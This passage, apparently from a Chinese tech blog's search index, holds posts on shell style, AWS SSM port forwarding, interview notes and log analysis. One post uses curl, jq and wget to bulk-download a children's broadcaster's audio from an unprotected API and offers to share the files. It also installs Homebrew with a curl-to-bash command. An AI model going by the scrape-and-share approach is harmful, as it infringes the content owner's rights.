<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ! mv <span class="string">"<span class="variable">$&#123;file_list&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dest_dir&#125;</span>/"</span> ; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Unable to move <span class="variable">$&#123;file_list&#125;</span> to <span class="variable">$&#123;dest_dir&#125;</span>"</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> <span class="string">"<span class="variable">$&#123;E_BAD_MOVE&#125;</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Or</span></span><br><span class="line">mv <span class="string">"<span class="variable">$&#123;file_list&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dest_dir&#125;</span>/"</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"$?"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Unable to move <span class="variable">$&#123;file_list&#125;</span> to <span class="variable">$&#123;dest_dir&#125;</span>"</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> <span class="string">"<span class="variable">$&#123;E_BAD_MOVE&#125;</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>Bash 同样有 PIPESTATUE 变量允许检查管道命令所有部分的返回码，这仅仅用于检查整个管道执行成功与否。下面的例子是被接受的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -cf - ./* | ( <span class="built_in">cd</span> <span class="string">"<span class="variable">$&#123;dir&#125;</span>"</span> &amp;&amp; tar -xf - )</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;PIPESTATUS[0]&#125;</span>"</span> -ne 0 || <span class="string">"<span class="variable">$&#123;PIPESTATUS[1]&#125;</span>"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Unable to tar files to <span class="variable">$&#123;dir&#125;</span>"</span> &gt;&amp;2</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>然后当你使用任何其它命令的时候 PIPESTATUS 将会被覆盖，如果你需要根据管道发生错误的地方来进行不同的操作，那么你将需要在运行完管道命令后立即将  PIPESTATUS 的值赋给另外一个变量(不要忘了[这个符号也是一个命令，将会把PIPESTATUS 的值给覆盖掉．)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -cf - ./* | ( <span class="built_in">cd</span> <span class="string">"<span class="variable">$&#123;DIR&#125;</span>"</span> &amp;&amp; tar -xf - )</span><br><span class="line">return_codes=(<span class="variable">$&#123;PIPESTATUS[*]&#125;</span>)</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;return_codes[0]&#125;</span>"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">  do_something</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;return_codes[1]&#125;</span>"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">  do_something_else</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h2 id="内置命令对比外部命令-Builtin-Commands-vs-External-Commands"><a href="#内置命令对比外部命令-Builtin-Commands-vs-External-Commands" class="headerlink" title="内置命令对比外部命令(Builtin Commands vs. External Commands)"></a>内置命令对比外部命令(Builtin Commands vs. External Commands)</h2><p>可以在调用 Shell 内建命令和调用另外的程序之间选择，请选择内建命令。</p>
<p>我们更喜欢使用内建命令，如在 bash(1) 中参数扩展函数。因为它更强健和便携（尤其是跟像 sed 这样的命令比较）</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Prefer this:</span></span><br><span class="line">addition=$((<span class="variable">$&#123;X&#125;</span> + <span class="variable">$&#123;Y&#125;</span>))</span><br><span class="line">substitution=<span class="string">"<span class="variable">$&#123;string/#foo/bar&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instead of this:</span></span><br><span class="line">addition=<span class="string">"<span class="variable">$(expr $&#123;X&#125; + $&#123;Y&#125;)</span>"</span></span><br><span class="line">substitution=<span class="string">"<span class="variable">$(echo "$&#123;string&#125;" | sed -e 's/^foo/bar/')</span>"</span></span><br></pre></td></tr></table></figure>
<h1 id="结论-Conclusion"><a href="#结论-Conclusion" class="headerlink" title="结论(Conclusion)"></a>结论(Conclusion)</h1><p>使用常识并（跟已有的）保持一致。</p>
<p>请使用几分钟来阅读 <a href="https://google.github.io/styleguide/cppguide.html" target="_blank" rel="noopener">C++(风格)指南</a>下部的 Parting Words 章节。</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul>
<li>原文来自于 Google 的 <a href="https://google.github.io/styleguide/shell.xml" target="_blank" rel="noopener">Shell Style Guide</a></li>
<li>参照 <a href="http://zh-google-styleguide.readthedocs.io/en/latest/google-shell-styleguide/contents/" target="_blank" rel="noopener">Shell 风格指南</a></li>
<li>参照 <a href="http://blog.csdn.net/zhangyifei216/article/details/50517511" target="_blank" rel="noopener">Google Style Guides-Shell Style Guide</a></li>
</ul>
<p>[^1]: 这里我有保留意见，我问个简单问题吧：10 年前写的同是 100+ 行的 python 代码和一段 bash 代码，哪一个能在现在的系统下正常跑的可能性更大呢？如果说 10 年前没有 python 的话那我换下问题：今天写同样 100+ 行的  python 代码和 bash 代码，10 年后谁还能正确运行的概率高呢？</p>
]]></content>
      <tags>
        <tag>Google</tag>
        <tag>Shell</tag>
        <tag>Bash</tag>
        <tag>programe</tag>
        <tag>code</tag>
        <tag>Style</tag>
        <tag>Guide</tag>
      </tags>
  </entry>
  <entry>
    <title>从官网扒某儿童频道的一些音频资源</title>
    <url>/2022/05/%E4%BB%8E%E5%AE%98%E7%BD%91%E6%89%92%E6%9F%90%E5%84%BF%E7%AB%A5%E9%A2%91%E9%81%93%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9F%B3%E9%A2%91%E8%B5%84%E6%BA%90/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>乐乐的倾听者的音频资源又需要更新了，于是跟我提了几个需求，让我去“下”（下载）某个著名儿童频道主播播讲的节目（有故事还有其他）。</p>
<span id="more"></span>

<h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>这个主播有官网，但是官网上没有资源，只有 app 和公众号（可能还有在喜马拉雅的）的二维码。</p>
<p>但是发现了其还是有一个移动版的“官网”（域名是 m. 开头的），这个网站跟官网貌似没有同步更新，上面还能直接听节目。</p>
<p>大致看了下页面源代码，很快就扒出了音频资源的下载链接，在命令行用 wget 抓了一下，居然也没有反盗链，实在是良心！</p>
<h2 id="具体脚本"><a href="#具体脚本" class="headerlink" title="具体脚本"></a>具体脚本</h2><p>先要准备环境（我是在 MacOS，所以用了 Homebrew）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Command Line Tools (CLT) for Xcode</span></span><br><span class="line">xcode-select --install</span><br><span class="line"><span class="comment"># Homebrew installation</span></span><br><span class="line">/bin/bash -c \ </span><br><span class="line">  <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment"># Install curl, jq, wget</span></span><br><span class="line">brew install curl jq wget</span><br></pre></td></tr></table></figure>

<p>下面开始抓取并声称下载资源的命令行。</p>
<h3 id="历史课"><a href="#历史课" class="headerlink" title="历史课"></a>历史课</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?mid=7268&amp;aid=516&amp;mids=&quot;</span> -o audiolist_qianer_history.json</span><br><span class="line"><span class="built_in">cat</span> audiolist_qianer_history.json | jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="comment"># curl &quot;https://m.xxx.xxx/api/media/audiolist.ashx?mid=7268&amp;aid=516&amp;mids=&quot; | jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="世界地理"><a href="#世界地理" class="headerlink" title="世界地理"></a>世界地理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=486&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="成语启蒙"><a href="#成语启蒙" class="headerlink" title="成语启蒙"></a>成语启蒙</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=250&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="世界历史"><a href="#世界历史" class="headerlink" title="世界历史"></a>世界历史</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=477&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="学诗词"><a href="#学诗词" class="headerlink" title="学诗词"></a>学诗词</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=8&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=88&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=89&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=90&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=91&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=92&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=93&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=337&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=342&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=341&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=340&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=339&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="名人传"><a href="#名人传" class="headerlink" title="名人传"></a>名人传</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=360&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=449&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="三十六计"><a href="#三十六计" class="headerlink" title="三十六计"></a>三十六计</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=485&quot;</span> | \</span><br><span class="line">    jq -r <span class="string">&#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后记得把命令输出的命令行代码拷贝出来，再粘贴出来执行一下。资源就会都下载到当前目录下了。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>需要这些资源又不想自己下载的可以找我。</p>
]]></content>
      <tags>
        <tag>下载</tag>
        <tag>音频</tag>
        <tag>儿童</tag>
        <tag>故事</tag>
        <tag>历史</tag>
        <tag>地理</tag>
        <tag>成语</tag>
        <tag>名人传</tag>
        <tag>诗词</tag>
        <tag>三十六计</tag>
      </tags>
  </entry>
  <entry>
    <title>几个问题</title>
    <url>/2020/12/%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>没啥可说的，面试被问了几个问题，感觉当时答的不太好，事后查了下文档，特此记录下。</p>
<h2 id="Docker-是基于什么"><a href="#Docker-是基于什么" class="headerlink" title="Docker 是基于什么"></a>Docker 是基于什么</h2><p>我理解是问 Docker 技术的底层原理是什么。</p>
<p>先看看 Docker 官方是怎么说的：</p>
<p><a href="https://docs.docker.com/get-started/overview/#the-underlying-technology">The underlying technology（(Docker 的）底层技术）</a></p>
<span id="more"></span>

<p>里面提到了四个方面：</p>
<ul>
<li>Namespaces</li>
<li>Control groups</li>
<li>Union file systems</li>
<li>Container format</li>
</ul>
<h3 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h3><p>这个其实就是 Linux 本身就支持的东西，Linux 支持 8 种 namespace(来自于 NAMESPACES 的 manual)：</p>
<table>
<thead>
<tr>
<th>Namespace</th>
<th>Flag</th>
<th>Page</th>
<th>Isolates</th>
</tr>
</thead>
<tbody><tr>
<td>Cgroup</td>
<td>CLONE_NEWCGROUP</td>
<td>cgroup_namespaces(7)</td>
<td>Cgroup root directory</td>
</tr>
<tr>
<td>IPC</td>
<td>CLONE_NEWIPC</td>
<td>ipc_namespaces(7)</td>
<td>System V IPC, POSIX message queues</td>
</tr>
<tr>
<td>Network</td>
<td>CLONE_NEWNET</td>
<td>network_namespaces(7)</td>
<td>Network devices, stacks, ports, etc.</td>
</tr>
<tr>
<td>Mount</td>
<td>CLONE_NEWNS</td>
<td>mount_namespaces(7)</td>
<td>Mount points</td>
</tr>
<tr>
<td>PID</td>
<td>CLONE_NEWPID</td>
<td>pid_namespaces(7)</td>
<td>Process IDs</td>
</tr>
<tr>
<td>Time</td>
<td>CLONE_NEWTIME</td>
<td>time_namespaces(7)</td>
<td>Boot and monotonic clocks</td>
</tr>
<tr>
<td>User</td>
<td>CLONE_NEWUSER</td>
<td>user_namespaces(7)</td>
<td>User and group IDs</td>
</tr>
<tr>
<td>UTS</td>
<td>CLONE_NEWUTS</td>
<td>uts_namespaces(7)</td>
<td>Hostname and NIS domain name</td>
</tr>
</tbody></table>
<p>Docker 用到了其中的 2、3、4、5、8 五种 namespaces</p>
<h3 id="Control-groups"><a href="#Control-groups" class="headerlink" title="Control groups"></a>Control groups</h3><p>这其实就是 cgroups，这也是 Linux kernel 就支持的一种技术</p>
<h3 id="Union-file-systems"><a href="#Union-file-systems" class="headerlink" title="Union file systems"></a>Union file systems</h3><p>这也就是 UnionFS，它可以把各个目录的内容挂载到同一个目录下。它的功能很复杂，Docker 的文件系统分层的架构就是由它实现的。</p>
<h3 id="Container-format"><a href="#Container-format" class="headerlink" title="Container format"></a>Container format</h3><p>文档上说 Docker 引擎把 namespaces、cgroups 和 UnionFS 组装到一个叫包装器的东西，就是 Container format，Docker 里缺省的叫 libcontainer，现在好像叫 runc 了。</p>
<h2 id="CLOSE-WAIT-状态"><a href="#CLOSE-WAIT-状态" class="headerlink" title="CLOSE_WAIT 状态"></a>CLOSE_WAIT 状态</h2><p>这个其实稍稍冷静下来画画状态迁移图就能想起来：被动关闭 tcp 连接的一方进入的第一个状态就是 CLOSE_WAIT，在这个状态里会通知应用层：对端过来发数据的通道已关闭，己方有数据要往对端发的赶紧发：），接下来应用发完剩下的数据后，会给对端再发 Fin，同时进入 LASK_ACK 状态，收到对端回的 ACK 后变成 CLOSED 状态。</p>
<h2 id="elasticsearch-集群中的节点类型"><a href="#elasticsearch-集群中的节点类型" class="headerlink" title="elasticsearch 集群中的节点类型"></a>elasticsearch 集群中的节点类型</h2><p>这个其实不是面试题，只是我想到了，就贴在这里。官方文档在这里：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.8/modules-node.html">ES 集群里的各种节点</a></p>
<ol>
<li>Master-eligible node<br> 这也就是传说中的 Master node，主节点。</li>
<li>Data node<br> 数据节点，没啥好解释的。</li>
<li>Ingest node<br> 翻译叫预处理节点字面上可能不太对，但意思是合适的，就是在数据写入或做 index 之前的预处理，像 pipeline 啥的</li>
<li>Tribe node<br> 这个也简单，译作部落节点完全是字面翻译，其实理解为这是可以连接多个 elasticsearch 集群的节点就对了.</li>
<li>Machine learning node<br> 机器学习节点，这个需要在大开了 xpark.ml.enabled 和 node.ml 之后才会有，我们一般的场景用不到。</li>
<li>Coordinating node<br> 协调节点，老版本中也有叫客户端节点（Client node）的。所有的节点都是协调节点，当然也可以单独配置独立的协调节点。客户端读写 elasticsearch 都是先连的协调节点。协调节点把请求分发到合适的节点，收集返回的数据处理完毕再返回给客户端。官方文档貌似不建议使用单独的协调节点，认为数据节点可以同时做好协调节点的工作。</li>
</ol>
<h2 id="jvm-堆的-32G-内存问题"><a href="#jvm-堆的-32G-内存问题" class="headerlink" title="jvm 堆的 32G 内存问题"></a>jvm 堆的 32G 内存问题</h2><p>简言之，当 jvm 堆的内存在 32G 以内时，系统会启用一个内存对象指针压缩技术，将内存对象指针（64 位）压缩；但当大于 32G 时，这个压缩技术不启用，系统必须使用 64 位的指针，导致内存浪费增大，而且大内存对于 GC 时也会更容易导致问题。</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>面试总结</tag>
        <tag>Cgroups</tag>
        <tag>Namespaces</tag>
        <tag>UnionFS</tag>
        <tag>CLOSE_WAIT</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 AWS System Manager 来连 VPC 内网的资源</title>
    <url>/2023/03/%E5%88%A9%E7%94%A8%20AWS%20System%20Manager%20%E6%9D%A5%E8%BF%9E%20VPC%20%E5%86%85%E7%BD%91%E7%9A%84%E8%B5%84%E6%BA%90/index.html</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="配置好的-EC2"><a href="#配置好的-EC2" class="headerlink" title="配置好的 EC2"></a>配置好的 EC2</h3><p>VPC 内需要有一台 EC2（有无公网 IP 好像没关系），并做好相关配置</p>
<h4 id="安装-SSM-Agent"><a href="#安装-SSM-Agent" class="headerlink" title="安装 SSM Agent"></a>安装 SSM Agent</h4><p>Amazon Linux（无论是 1，还是 2，或者是 2023） 一般是预装好的，只需要确认是否正常启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl status amazon-ssm-agent</span><br><span class="line"><span class="comment"># 如果没有启动的话，设置为自启动，并启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> amazon-ssm-agent</span><br><span class="line">sudo systemctl start amazon-ssm-agent</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>如果系统没有安装过 SSM Agent，那么安装（以 CentOS 8 为例）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dnf install -y \</span><br><span class="line">    https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm</span><br></pre></td></tr></table></figure>

<h4 id="激活“默认主机管理配置”"><a href="#激活“默认主机管理配置”" class="headerlink" title="激活“默认主机管理配置”"></a>激活“默认主机管理配置”</h4><ol>
<li>访问 <a href="https://console.aws.amazon.com/systems-manager/">https://console.aws.amazon.com/systems-manager/</a>，打开 AWS Systems Manager 控制台。</li>
<li>在导航窗格中，选择 <strong>Fleet Manager</strong>。或者如果首先打开 AWS Systems Manager 主页，选择菜单图标 (  <img src="https://docs.aws.amazon.com/zh_cn/systems-manager/latest/userguide/images/menu-icon-small.png" alt="The menu icon">) 以打开导航窗格，然后在导航窗格中选择 <strong>Fleet Manager</strong>。</li>
<li>在<strong>账户管理</strong>下拉列表中选择<strong>默认主机管理配置</strong>。</li>
<li>打开<strong>启用默认主机管理配置</strong>。</li>
<li>选择用于为您的实例启用 Systems Manager 功能的 AWS Identity and Access Management（IAM）角色。我们建议使用“默认主机管理配置”提供的默认角色。它包含使用 Systems Manager 管理您的 Amazon EC2 实例所需的最低权限集合。如果您更喜欢使用自定义角色，则该角色的信任策略必须允许 Systems Manager 作为可信实体。</li>
<li>选择<strong>配置</strong>以完成设置。</li>
</ol>
<p>注意：</p>
<p>在打开“默认主机管理配置”后，您的实例可能需要最长 30 分钟才能使用所选角色的凭证。您必须在要自动管理 Amazon EC2 实例的每个区域中打开“默认主机管理配置”。</p>
<p>如不做其他调整，最多 30 分钟以后，你会在 System Manager -&gt; Fleet Manager -&gt; Managed nodes 下看到你的 EC2 了</p>
<h3 id="本地-aws-cli-和-Session-Manager-plugin"><a href="#本地-aws-cli-和-Session-Manager-plugin" class="headerlink" title="本地 aws-cli 和 Session Manager plugin"></a>本地 aws-cli 和 Session Manager plugin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我的本地环境是 Macbook Air (m1)，</span></span><br><span class="line"><span class="comment"># 其他环境可能命令不一样</span></span><br><span class="line">curl \</span><br><span class="line">    <span class="string">&quot;https://awscli.amazonaws.com/AWSCLIV2.pkg&quot;</span> \</span><br><span class="line">    -o <span class="string">&quot;AWSCLIV2.pkg&quot;</span></span><br><span class="line">sudo installer \</span><br><span class="line">    -pkg AWSCLIV2.pkg \</span><br><span class="line">    -target /</span><br><span class="line"><span class="comment"># 以上命令是安装 aws-cli。</span></span><br><span class="line"><span class="comment"># 然后当然还需要配置 aws --configure</span></span><br><span class="line"><span class="comment"># 或 aws --profile xxx --configure</span></span><br><span class="line">curl \</span><br><span class="line">    <span class="string">&quot;https://s3.amazonaws.com/session-manager-downloads/plugin/latest/mac_arm64/session-manager-plugin.pkg&quot;</span> \</span><br><span class="line">    -o <span class="string">&quot;session-manager-plugin.pkg&quot;</span></span><br><span class="line">sudo installer \</span><br><span class="line">    -pkg session-manager-plugin.pkg \</span><br><span class="line">    -target /</span><br><span class="line">sudo <span class="built_in">ln</span> \</span><br><span class="line">    -s /usr/local/sessionmanagerplugin/bin/session-manager-plugin \</span><br><span class="line">    /usr/local/bin/session-manager-plugin</span><br></pre></td></tr></table></figure>

<h2 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h2><h3 id="场景一：登录服务器"><a href="#场景一：登录服务器" class="headerlink" title="场景一：登录服务器"></a>场景一：登录服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aws --profile <span class="built_in">test</span> \</span><br><span class="line">    ssm start-session \</span><br><span class="line">    --target i-xxxxxxxxxxxxxxxxxx</span><br><span class="line"><span class="comment"># &quot;i-xxxxxxxxxxxxxxxxxx&quot; 是这台 EC2 的 ID</span></span><br></pre></td></tr></table></figure>

<h3 id="场景二：打洞到-RDS"><a href="#场景二：打洞到-RDS" class="headerlink" title="场景二：打洞到 RDS"></a>场景二：打洞到 RDS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aws --profile <span class="built_in">test</span> \</span><br><span class="line">    ssm start-session \</span><br><span class="line">    --target i-xxxxxxxxxxxxxxxxxx \</span><br><span class="line">    --document-name AWS-StartPortForwardingSessionToRemoteHost \</span><br><span class="line">    --parameters 、</span><br><span class="line">    host=<span class="string">&quot;10.0.0.1&quot;</span>,portNumber=<span class="string">&quot;3306&quot;</span>,localPortNumber=<span class="string">&quot;5555&quot;</span></span><br><span class="line"><span class="comment"># 这里的 “10.0.0.1” 是你要连的 MySQL 的 IP 地址，是假设的，得根据实际情况修改</span></span><br></pre></td></tr></table></figure>

<p>然后就可以愉快的在本地连数据库了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -P 5555 -U admin -p</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>AWS System Manager</tag>
        <tag>Session Manager</tag>
        <tag>SSM</tag>
        <tag>amazon-ssm-agent</tag>
        <tag>Fleet Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 sed 和 awk 做简单日志分析</title>
    <url>/2020/06/%E5%88%A9%E7%94%A8%20sed%20%E5%92%8C%20awk%20%E5%81%9A%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/index.html</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>本实验是在 macOS 下做的，Linux 下可能会稍有不同（比如 gzcat）。</p>
<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzcat data.gz | <span class="built_in">head</span> -n 40 <span class="comment"># data.gz 是日志文件</span></span><br></pre></td></tr></table></figure>

<p>系统输出：</p>
<blockquote>
<p>May 13 00:01:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12513]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:01:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12513]): Service exited with abnormal code: 78<br>May 13 00:02:12 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.pid.mdmclient.12523): Failed to bootstrap path: path &#x3D; &#x2F;usr&#x2F;libexec&#x2F;mdmclient, error &#x3D; 108: Invalid path<br>May 13 00:04:20 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender Statistics<br>May 13 00:05:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12535]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:05:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12535]): Service exited with abnormal code: 78<br>May 13 00:09:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12536]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:09:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12536]): Service exited with abnormal code: 78<br>May 13 00:17:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12555]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:17:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12555]): Service exited with abnormal code: 78<br>May 13 00:17:59 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender Statistics<br>May 13 00:19:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12556]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:19:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12556]): Service exited with abnormal code: 78<br>May 13 00:21:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12560]): Could not find uid associated with service: 0: Undefined error: 